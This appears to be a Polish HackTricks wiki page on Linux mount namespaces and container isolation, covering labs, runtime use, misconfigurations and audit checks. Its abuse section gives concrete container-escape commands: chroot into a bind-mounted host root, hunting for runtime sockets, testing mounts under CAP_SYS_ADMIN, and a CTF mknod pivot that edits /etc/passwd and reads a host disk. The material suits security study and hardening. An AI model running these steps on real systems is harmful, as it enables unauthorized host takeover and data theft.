# Przestrzeń nazw montowania

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw montowania kontroluje **tablicę montowa**, którą widzi proces. Jest to jedna z najważniejszych funkcji izolacji kontenera, ponieważ root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure oraz wiele runtime‑specyficznych pomocniczych montowań są wyrażone przez tę tablicę montowań. Dwa procesy mogą oba uzyskiwać dostęp do `/`, `/proc`, `/sys` lub `/tmp`, ale to, do czego te ścieżki się odnoszą, zależy od przestrzeni nazw, w której się znajdują.

Z perspektywy bezpieczeństwa kontenerów, przestrzeń nazw montowania często decyduje o różnicy między „to jest starannie przygotowany system plików aplikacji” a „ten proces może bezpośrednio zobaczyć lub wpłynąć na system plików hosta”. Dlatego bind mounts, `hostPath` volumes, uprzywilejowane operacje montowania oraz zapisywalne wystawienia `/proc` lub `/sys` wszystkie kręcą się wokół tej przestrzeni nazw.

## Działanie

Gdy runtime uruchamia kontener, zwykle tworzy świeżą przestrzeń nazw montowania, przygotowuje root filesystem dla kontenera, montuje procfs i inne pomocnicze systemy plików w razie potrzeby, a następnie opcjonalnie dodaje bind mounts, tmpfs mounts, secrets, config maps lub host paths. Gdy ten proces działa wewnątrz przestrzeni nazw, zestaw montowań, które widzi, jest w dużej mierze odseparowany od domyślnego widoku hosta. Host wciąż może widzieć rzeczywisty podstawowy system plików, ale kontener widzi wersję złożoną dla niego przez runtime.

To jest potężne, ponieważ pozwala kontenerowi wierzyć, że ma własny system plików root, mimo że host wciąż zarządza wszystkim. Jest to również niebezpieczne, ponieważ jeśli runtime wystawi niewłaściwy mount, proces nagle uzyskuje widoczność zasobów hosta, które reszta modelu bezpieczeństwa mogła nie być zaprojektowana, aby chronić.

## Laboratorium

Możesz utworzyć prywatną przestrzeń nazw montowania za pomocą:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Jeśli otworzysz inny shell poza tą namespace i sprawdzisz mount table, zobaczysz, że tmpfs mount istnieje tylko wewnątrz izolowanej mount namespace. To przydatne ćwiczenie, ponieważ pokazuje, że mount isolation nie jest abstrakcyjną teorią; kernel dosłownie przedstawia procesowi inną mount table.
Jeśli otworzysz inny shell poza tą namespace i sprawdzisz mount table, tmpfs mount będzie istnieć tylko wewnątrz izolowanej mount namespace.

W kontenerach szybkie porównanie wygląda następująco:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi przykład pokazuje, jak łatwo runtime-configuration może przedziurawić granicę systemu plików.

## Użycie w czasie działania

Docker, Podman, containerd-based stacks, and CRI-O all rely on a private mount namespace for normal containers. Kubernetes builds on top of the same mechanism for volumes, projected secrets, config maps, and `hostPath` mounts. Incus/LXC environments also rely heavily on mount namespaces, especially because system containers often expose richer and more machine-like filesystems than application containers do.

Oznacza to, że analizując problem z systemem plików kontenera, zwykle nie patrzysz na izolowany quirk Dockera. Patrzysz na mount-namespace i runtime-configuration wyrażony przez platformę, która uruchomiła workload.

## Błędne konfiguracje

Najbardziej oczywistym i niebezpiecznym błędem jest wystawienie host root filesystem lub innej wrażliwej ścieżki hosta przez bind mount, na przykład `-v /:/host` lub zapisywalny `hostPath` w Kubernetes. W tym momencie pytanie przestaje brzmieć "can the container somehow escape?" a staje się raczej "how much useful host content is already directly visible and writable?" Zapisywalny host bind mount często zamienia resztę exploitu w prostą sprawę umieszczenia pliku, chrooting, config modification lub runtime socket discovery.

Innym częstym problemem jest wystawienie host `/proc` lub `/sys` w sposób, który omija bezpieczniejszy widok kontenera. Te systemy plików nie są zwykłymi mountami danych; są interfejsami do stanu jądra i procesów. Jeśli workload sięga bezpośrednio do wersji hosta, wiele założeń stojących za hardeningiem kontenera przestaje mieć zastosowanie.

Ochrony typu read-only też mają znaczenie. Read-only root filesystem nie zabezpiecza magicznie kontenera, ale usuwa dużą część przestrzeni stagingowej atakującego i utrudnia persistence, helper-binary placement oraz config tampering. Z kolei zapisywalny root lub zapisywalny host bind mount daje atakującemu miejsce na przygotowanie kolejnego kroku.

## Nadużycia

When the mount namespace is misused, attackers commonly do one of four things. They **czytają dane hosta** that should have remained outside the container. They **modyfikują konfigurację hosta** through writable bind mounts. They **mount or remount additional resources** if capabilities and seccomp allow it. Or they **reach powerful sockets and runtime state directories** that let them ask the container platform itself for more access.

If the container can already see the host filesystem, the rest of the security model changes immediately.

When you suspect a host bind mount, first confirm what is available and whether it is writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Jeśli root filesystem hosta jest zamontowany jako read-write, bezpośredni dostęp do hosta często jest tak prosty jak:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Jeśli celem jest uzyskanie uprzywilejowanego dostępu w czasie wykonywania zamiast bezpośredniego chrooting, wyenumeruj gniazda i stan środowiska wykonawczego:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Jeśli `CAP_SYS_ADMIN` jest obecny, sprawdź również, czy z wnętrza kontenera można tworzyć nowe mounts:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Pełny przykład: Two-Shell `mknod` Pivot

Bardziej wyspecjalizowana ścieżka nadużycia pojawia się, gdy użytkownik root w kontenerze może tworzyć urządzenia blokowe, host i kontener dzielą tożsamość użytkownika w użyteczny sposób, a atakujący ma już niskoprzywilejowy punkt zaczepienia na hoście. W takiej sytuacji kontener może utworzyć węzeł urządzenia, na przykład `/dev/sda`, a niskoprzywilejowy użytkownik hosta może później odczytać go przez `/proc/<pid>/root/` dla odpowiadającego procesu kontenera.

Wewnątrz kontenera:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Na hoście, jako odpowiadający użytkownik o niskich uprawnieniach po zlokalizowaniu PID powłoki kontenera:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Najważniejsza lekcja nie polega na dokładnym wyszukiwaniu ciągu w CTF. Chodzi o to, że mount-namespace exposure przez `/proc/<pid>/root/` może pozwolić użytkownikowi hosta na ponowne użycie container-created device nodes, nawet jeśli cgroup device policy uniemożliwiało ich bezpośrednie użycie wewnątrz samego container.

## Sprawdzenia

Te polecenia pokazują widok filesystemu, w którym faktycznie działa bieżący proces. Celem jest wykrycie host-derived mounts, writable sensitive paths oraz wszystkiego, co wydaje się bardziej rozległe niż normalny application container root filesystem.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Co jest tutaj interesujące:

- Bind mounts z hosta, zwłaszcza `/`, `/proc`, `/sys`, katalogi stanu runtime lub lokalizacje socketów, powinny od razu rzucać się w oczy.
- Nieoczekiwane read-write mounts są zwykle ważniejsze niż duża liczba read-only helper mounts.
- `mountinfo` jest często najlepszym miejscem, by sprawdzić, czy ścieżka faktycznie pochodzi z hosta, czy jest oparta na overlay.

Te kontrole określają **które zasoby są widoczne w tej przestrzeni nazw**, **które z nich pochodzą z hosta**, oraz **które z nich są zapisywalne lub wrażliwe z punktu widzenia bezpieczeństwa**.
{{#include ../../../../../banners/hacktricks-training.md}}
